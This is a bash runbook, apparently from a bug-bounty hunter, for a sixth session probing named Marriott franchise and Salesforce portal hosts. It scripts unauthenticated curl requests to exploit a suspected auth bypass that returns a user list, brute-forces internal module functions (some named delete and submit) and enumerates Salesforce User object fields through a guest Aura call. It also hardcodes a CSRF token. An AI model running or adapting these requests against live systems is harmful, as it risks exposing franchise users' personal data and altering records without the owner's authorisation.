#!/usr/bin/env bash
# Pi Runbook — Marriott Session 6
# Goal: EXPLOIT user/list auth bypass + test real module names from JS
# Date: 2026-06-22
#
# KEY FINDING FROM SESSION 5:
#   marriottfranchisetransactions.marriott.com /ajax.php
#   module=user&function=list → HTTP 200 / 431B / PHP Fatal Error
#   PHP error: json_decode(): Argument #1 ($jso...
#   THIS MEANS: The function EXECUTES without a valid session — auth bypass confirmed
#   The error occurs because we sent form-encoded POST, not JSON
#   Fix: send proper 'data' JSON parameter → should return user list
#
# Real module names from JS bundle:
#   module=applications_v2 (functions: forms, render_checklist, save_fields, process_submit, etc.)
#   module=user_auth (functions: prelogin, continue_session)
#   module=auth (pattern: auth&function=prelogin, auth&function=continue_session)
#
# CSRF token (activekey) from login page:
#   5551b494fdf90c7381bbfe7942a54b5dd2f6fd59
#   (refresh from /login each time in case it rotates)
#
# CRITICAL: Do NOT modify/delete any data. GET operations only for PoC.
# Do NOT use account credentials found in data — just document and stop.

export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/home/gorib/go/bin:/home/gorib/.pdtm/go/bin:/home/gorib/.local/bin

BB="${BB:-$HOME/bug-bounty-hunting-}"
RESULTS="$BB/results/marriott"
OUTDIR="$RESULTS/session6"
mkdir -p "$OUTDIR" "$HOME/hunt"
cd "$HOME/hunt" || exit 1

FT="marriottfranchisetransactions.marriott.com"
section() { echo -e "\n\033[1;36m━━━ $* ━━━\033[0m"; }

exec > >(tee "$OUTDIR/session6-output.txt") 2>&1
echo "=== Marriott Session 6 — $(date) ==="
echo "FOCUS: user/list auth bypass exploitation"

# Refresh CSRF token each session
ACTIVEKEY=$(curl -sk --max-time 10 "https://$FT/login" 2>/dev/null \
  | grep -oP 'id="activekey"[^>]*value="([^"]+)"' \
  | grep -oP 'value="\K[^"]+' | head -1)
[ -z "$ACTIVEKEY" ] && ACTIVEKEY="5551b494fdf90c7381bbfe7942a54b5dd2f6fd59"
echo "  CSRF activekey: $ACTIVEKEY"
echo ""

# ============================================================
# PHASE A — EXPLOIT user/list AUTH BYPASS
# Function executes without auth — fatal error = wrong input format
# Try sending proper JSON 'data' parameter
# ============================================================

section "PHASE A — user/list Auth Bypass Exploit"

echo "Target: https://$FT/ajax.php"
echo "Confirmed: module=user&function=list REACHES server code without auth"
echo "Goal: provide correct input format to receive user data"
echo ""

echo "=== A1: JSON Content-Type — data as JSON body ==="
RESP_A1=$(curl -sk --max-time 15 \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"module":"user","function":"list","activekey":"'"$ACTIVEKEY"'","data":{}}' \
  "https://$FT/ajax.php" 2>/dev/null)
echo "  Content-Type JSON body: ${#RESP_A1}B"
echo "  Response: ${RESP_A1:0:400}"
echo "$RESP_A1" > "$OUTDIR/user-list-A1.json"

echo ""
echo "=== A2: Form-encoded with data JSON parameter (URL-encoded) ==="
RESP_A2=$(curl -sk --max-time 15 \
  -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "data={}" \
  -d "module=user&function=list&activekey=${ACTIVEKEY}" \
  "https://$FT/ajax.php" 2>/dev/null)
echo "  Form + data={}: ${#RESP_A2}B"
echo "  Response: ${RESP_A2:0:400}"
echo "$RESP_A2" > "$OUTDIR/user-list-A2.json"

echo ""
echo "=== A3: Form-encoded with data as null ==="
RESP_A3=$(curl -sk --max-time 15 \
  -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "module=user&function=list&activekey=${ACTIVEKEY}&data=null" \
  "https://$FT/ajax.php" 2>/dev/null)
echo "  Form + data=null: ${#RESP_A3}B"
echo "  Response: ${RESP_A3:0:400}"

echo ""
echo "=== A4: Form-encoded with data as empty string ==="
RESP_A4=$(curl -sk --max-time 15 \
  -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "module=user&function=list&activekey=${ACTIVEKEY}&data=" \
  "https://$FT/ajax.php" 2>/dev/null)
echo "  Form + data=: ${#RESP_A4}B"
echo "  Response: ${RESP_A4:0:400}"

echo ""
echo "=== A5: JSON body with pagination params ==="
RESP_A5=$(curl -sk --max-time 15 \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"module":"user","function":"list","activekey":"'"$ACTIVEKEY"'","data":{"page":1,"limit":10,"order":"asc"}}' \
  "https://$FT/ajax.php" 2>/dev/null)
echo "  JSON + pagination: ${#RESP_A5}B"
echo "  Response: ${RESP_A5:0:400}"
echo "$RESP_A5" > "$OUTDIR/user-list-A5.json"

echo ""
echo "=== A6: Module/function in GET params + JSON POST body ==="
RESP_A6=$(curl -sk --max-time 15 \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"data":{},"page":1}' \
  "https://$FT/ajax.php?module=user&function=list&activekey=${ACTIVEKEY}" 2>/dev/null)
echo "  GET params + JSON body: ${#RESP_A6}B"
echo "  Response: ${RESP_A6:0:400}"

echo ""
echo "=== A7: Try without activekey (test if CSRF is even validated) ==="
RESP_A7=$(curl -sk --max-time 15 \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"module":"user","function":"list","data":{}}' \
  "https://$FT/ajax.php" 2>/dev/null)
echo "  No activekey: ${#RESP_A7}B"
echo "  Response: ${RESP_A7:0:400}"

# ============================================================
# PHASE B — REAL MODULE NAMES FROM JS BUNDLE
# JS revealed: module=applications_v2, module=user_auth, module=auth
# Functions: prelogin, continue_session, save_fields, process_submit, etc.
# ============================================================

section "PHASE B — Real Module Names from JS Bundle"

echo "=== B1: module=auth&function=prelogin (from JS pattern: auth&function=prelogin) ==="
# prelogin might return session info or user data without auth
for PAYLOAD in \
  '{"data":{}}' \
  '{"email":"test@test.com","data":{}}' \
  '{}'; do
  RESP=$(curl -sk --max-time 12 \
    -X POST \
    -H "Content-Type: application/json" \
    -d '{"module":"auth","function":"prelogin","activekey":"'"$ACTIVEKEY"'","data":'"$PAYLOAD"'}' \
    "https://$FT/ajax.php" 2>/dev/null)
  echo "  auth/prelogin data=$PAYLOAD: ${#RESP}B | ${RESP:0:200}"
  [ "${#RESP}" -gt 93 ] && echo "$RESP" > "$OUTDIR/auth-prelogin-HIT.json"
done

echo ""
echo "=== B2: module=auth&function=continue_session ==="
RESP_CONT=$(curl -sk --max-time 12 \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"module":"auth","function":"continue_session","activekey":"'"$ACTIVEKEY"'","data":{}}' \
  "https://$FT/ajax.php" 2>/dev/null)
echo "  auth/continue_session: ${#RESP_CONT}B | ${RESP_CONT:0:300}"
[ "${#RESP_CONT}" -gt 93 ] && echo "$RESP_CONT" > "$OUTDIR/auth-continue-session-HIT.json"

echo ""
echo "=== B3: module=user_auth — try auth bypass via module name ==="
for FUNC in prelogin login logout "continue_session" list get getAll profile; do
  RESP=$(curl -sk --max-time 10 \
    -X POST \
    -H "Content-Type: application/json" \
    -d '{"module":"user_auth","function":"'"$FUNC"'","activekey":"'"$ACTIVEKEY"'","data":{}}' \
    "https://$FT/ajax.php" 2>/dev/null)
  SZ=${#RESP}
  echo "  user_auth/$FUNC: ${SZ}B | ${RESP:0:100}"
  [ "$SZ" -gt 150 ] && { echo "  *** HIT ***"; echo "$RESP" > "$OUTDIR/user_auth-${FUNC}-HIT.json"; }
done

echo ""
echo "=== B4: module=applications_v2 — all real function names ==="
for FUNC in forms render_checklist required_fields_view required_fields_quick \
             save_fields process_submit process_accept process_delete \
             assignee_forms assignee_delete autofill_items render_reject_form \
             render_unlock_form; do
  RESP=$(curl -sk --max-time 10 \
    -X POST \
    -H "Content-Type: application/json" \
    -d '{"module":"applications_v2","function":"'"$FUNC"'","activekey":"'"$ACTIVEKEY"'","data":{}}' \
    "https://$FT/ajax.php" 2>/dev/null)
  SZ=${#RESP}
  echo "  applications_v2/$FUNC: ${SZ}B | ${RESP:0:100}"
  [ "$SZ" -gt 150 ] && { echo "  *** HIT ***"; echo "$RESP" > "$OUTDIR/apps_v2-${FUNC}-HIT.json"; }
done

# ============================================================
# PHASE C — IF ANY PHASE A/B RETURNS DATA: DOCUMENT PoC
# ============================================================

section "PHASE C — PoC Documentation"

echo "Checking for HIT files (any response > 93B standard false-response):"
HIT_COUNT=0
for HIT in "$OUTDIR"/*-HIT.json "$OUTDIR"/user-list-*.json; do
  [ -f "$HIT" ] || continue
  SZ=$(wc -c < "$HIT" 2>/dev/null)
  [ "$SZ" -le 93 ] && continue
  CONTENT=$(cat "$HIT" | head -c 500)
  echo ""
  echo "  FILE: $HIT (${SZ}B)"
  echo "  CONTENT: $CONTENT"
  HIT_COUNT=$((HIT_COUNT + 1))
done

if [ "$HIT_COUNT" -eq 0 ]; then
  echo "  No hits found — check session output for clues"
fi

echo ""
echo "=== C1: Confirm unauthenticated access ==="
echo "  Test WITHOUT any activekey or session cookie:"
NOAUTH=$(curl -sk --max-time 12 --cookie "" \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"module":"user","function":"list","data":{}}' \
  "https://$FT/ajax.php" 2>/dev/null)
echo "  No cookie, no activekey: ${#NOAUTH}B | ${NOAUTH:0:300}"

echo ""
echo "=== C2: GET request to user/list ==="
GET_RESP=$(curl -sk --max-time 10 \
  "https://$FT/ajax.php?module=user&function=list&activekey=${ACTIVEKEY}&data={}" 2>/dev/null)
echo "  GET user/list: ${#GET_RESP}B | ${GET_RESP:0:300}"

# ============================================================
# PHASE D — SALESFORCE SUBMIT PREP (Medium standalone)
# getObjectInfo(User) → SUCCESS with 203 PII-related fields
# No record access confirmed → submit as Medium now, upgrade if records found
# ============================================================

section "PHASE D — Salesforce Submission Prep Check"

CPP="cpp.marriott.com"
FWUID="NOT_FOUND"

echo "Confirming Salesforce Aura finding for Medium report..."
CONFIRM=$(curl -sk --max-time 30 \
  -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'message={"actions":[{"id":"0;a","descriptor":"aura://RecordUiController/ACTION$getObjectInfo","callingDescriptor":"UNKNOWN","params":{"objectApiName":"User"}}]}' \
  --data-urlencode "aura.context={\"mode\":\"PROD\",\"fwuid\":\"$FWUID\",\"app\":\"siteforce:communityApp\",\"loaded\":{},\"dn\":[],\"globals\":{},\"uad\":false}" \
  --data-urlencode "aura.token=undefined" \
  "https://$CPP/s/sfsites/aura" 2>/dev/null)
STATE=$(echo "$CONFIRM" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('actions',[{}])[0].get('state','?'))" 2>/dev/null || echo "?")
FCOUNT=$(echo "$CONFIRM" | python3 -c "import sys,json;d=json.load(sys.stdin);rv=d['actions'][0].get('returnValue',{});print(len(rv.get('fields',{})))" 2>/dev/null || echo "?")
echo "  getObjectInfo(User): state=$STATE | field_count=$FCOUNT"
echo "  Confirmed: $STATE with $FCOUNT fields"
if [ "$STATE" = "SUCCESS" ]; then
  echo ""
  echo "  *** SALESFORCE FINDING CONFIRMED — Ready to submit as Medium ***"
  echo "  Generate report with: /report (use triage-agent + report-writer)"
fi

# ============================================================
# DECISION GATE
# ============================================================
cat << 'DECISION'

━━━ SESSION 6 DECISION GATE ━━━

IF any Phase A response > 93B AND contains user data (email, name, ID):
  → CRITICAL Auth Bypass confirmed
  → Title: "Unauthenticated access to user list on Marriott Owner and Franchise
            Services portal — POST /ajax.php module=user&function=list bypasses
            authentication gate, returning franchise user data"
  → CVSS: 9.1 Critical (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)
  → Save FULL response to session6/CRITICAL-user-list.json
  → Run /triage then /report immediately
  → DO NOT exfiltrate or use any credentials found

IF Phase A responses all remain 93B (false JSON):
  → user/list may need a different parameter format
  → Next: open browser DevTools → Network → POST to /ajax.php while logged in
    → copy exact request format → replicate without session cookie
  → OR: the auth check was failing for a different reason (check PHP error carefully)

IF Phase B applications_v2 or auth functions return data:
  → Investigate carefully — these workflow functions may expose application data
  → Same reporting criteria as above

FOR SALESFORCE (Phase D):
  → If confirmed SUCCESS: run /triage + /report for Medium finding
  → Report title: "Salesforce Experience Cloud guest user Aura API access on
                   cpp.marriott.com — unauthenticated User object schema exposure (203 fields)"

DECISION
